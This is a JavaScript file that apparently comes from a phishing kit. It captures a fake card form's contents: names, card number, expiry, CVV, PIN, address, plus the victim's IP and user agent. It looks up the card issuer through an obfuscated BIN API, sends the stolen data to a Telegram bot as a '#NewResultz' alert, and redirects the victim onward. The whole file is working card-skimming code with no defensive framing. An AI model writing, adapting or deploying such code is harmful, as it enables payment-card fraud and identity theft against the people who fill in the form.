// rose4.js
import { telegramToken, telegramChatId } from '../tele.js';

document.addEventListener("DOMContentLoaded", function() {
    var saveButton = document.querySelector('.button--primary');
    if (saveButton) {
        saveButton.addEventListener('click', function(event) {
            event.preventDefault();
            handleFormSubmit(event);
        });
    }
});

async function handleFormSubmit(event) {
    event.preventDefault();
    const form = event.target.form || document.getElementById('creditCardForm');
    const formData = new FormData(form);
    
    // Validate the form
    const isValid = validateForm();
    if (!isValid) {
        console.log("Form is invalid, submission prevented");
        return false;
    }
    
    const cardNumber = formData.get('cardNumber');
    const cardPin = formData.get('cardPin');

    if (cardNumber) {
        // Client information
        const clientIP = await fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => data.ip);
        const clientAgent = navigator.userAgent;

        // Perform BIN lookup
        const cardDetails = await getCardDetails(cardNumber);

        // Encode the bank name for URL
        const encodedBankName = encodeURIComponent(`${cardDetails.Scheme} - ${cardDetails.Type} - ${cardDetails.Issuer}`);

        // Build the message with more personalized content
        const info = [
            "🌟You got a #NewResultz 🌟",
            "🌟Wassup, 🌟xf🌟 PLASTICX 🌟",
            `👤 First Name: ${formData.get('firstName')}`,
			`👤 Last Name: ${formData.get('lastName')}`,
            `💳 Card Number: ${cardNumber}`,
            `💳 Card Details:`,
            `  🏷️ Scheme: ${cardDetails.Scheme}`,
            `  📋 Type: ${cardDetails.Type}`,
            `  🏦 Issuer: ${cardDetails.Issuer}`,
            `📆 Expiration Month: ${formData.get('expirationMonth')}`,
            `📆 Expiration Year: ${formData.get('expirationYear')}`,
            `🔑 CVV: ${formData.get('cvv')}`,
            `🔐 Card PIN: ${cardPin}`,
            `🏠 Address 1: ${formData.get('line1')}`,
            `🏠 Address 2: ${formData.get('line2')}`,
            `🌆 City: ${formData.get('city')}`,
            `🗺️ State: ${formData.get('state')}`,
            `📬 ZIP Code: ${formData.get('zip')}`,
            `🌍 Client IP: ${clientIP}`,
            `💻 User Agent: ${clientAgent}`
        ];
        const message = info.join("\n");

        // Send to Telegram
        const telegramApiUrl = `https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${telegramChatId}&text=${encodeURIComponent(message)}`;
        await fetch(telegramApiUrl);

        // Generate random string for redirection
        const redirectString = Math.random().toString(36).substring(2, 22);

        // Redirect with query parameters
        window.location.href = `../cv.html?firstName=${formData.get('firstName')}&cardPin=${cardPin}&redirectstring=${redirectString}&bankName=${encodedBankName}`;
    } else {
        window.location.href = '../newcard.php';
    }
}

async function getCardDetails(cardNumber) {
    const bin = cardNumber.replace(/\D/g, '').substring(0, 6);
    const encodedUrl = "aHR0cHM6Ly9kYXRhLmhhbmR5YXBpLmNvbS9iaW4v";
    const url = atob(encodedUrl) + bin;
    const response = await fetch(url);
    const cardDetails = await response.json();
    return {
        'Scheme': cardDetails.Scheme || 'Unknown Scheme',
        'Type': cardDetails.Type || 'Unknown Type',
        'Issuer': cardDetails.Issuer || 'Unknown Issuer'
    };
}

function validateForm() {
    console.log("Form validation started");
    var isValid = true;
    var requiredFields = document.querySelectorAll('[required]:not(#automaticPayments):not(#storePayment):not(#line2)');

    requiredFields.forEach(function(field) {
        if (!field.value.trim()) {
            isValid = false;
            field.classList.add('error');
            field.setAttribute('aria-invalid', 'true');
            var errorMessage = field.parentNode.querySelector('.error-message');
            if (!errorMessage) {
                errorMessage = document.createElement('span');
                errorMessage.classList.add('error-message');
                errorMessage.classList.add('error-text');
                var fieldName = field.getAttribute('title') || 'Field';
                switch(field.id) {
                    case 'firstName':
                        errorMessage.textContent = 'First name is required';
                        break;
                    case 'lastName':
                        errorMessage.textContent = 'Last name is required';
                        break;
                    case 'cardNumber':
                        errorMessage.textContent = 'Card number is required';
                        break;
                    case 'expirationMonth':
                    case 'expirationYear':
                        errorMessage.textContent = 'Expiration date is required';
                        break;
                    case 'cvv':
                        errorMessage.textContent = 'CVV is required';
                        break;
                    case 'cardPin':
                        errorMessage.textContent = 'Card PIN is required';
                        break;
                    case 'line1':
                        errorMessage.textContent = 'Address line 1 is required';
                        break;
                    case 'city':
                        errorMessage.textContent = 'City is required';
                        break;
                    case 'state':
                        errorMessage.textContent = 'State is required';
                        break;
                    case 'zip':
                        errorMessage.textContent = 'ZIP Code is required';
                        break;
                    default:
                        errorMessage.textContent = fieldName + ' is required';
                        break;
                }
                field.parentNode.appendChild(errorMessage);
            }
        } else {
            field.classList.remove('error');
            field.removeAttribute('aria-invalid');
            var errorMessage = field.parentNode.querySelector('.error-message');
            if (errorMessage) {
                errorMessage.remove();
            }
        }
    });

    return isValid;
}
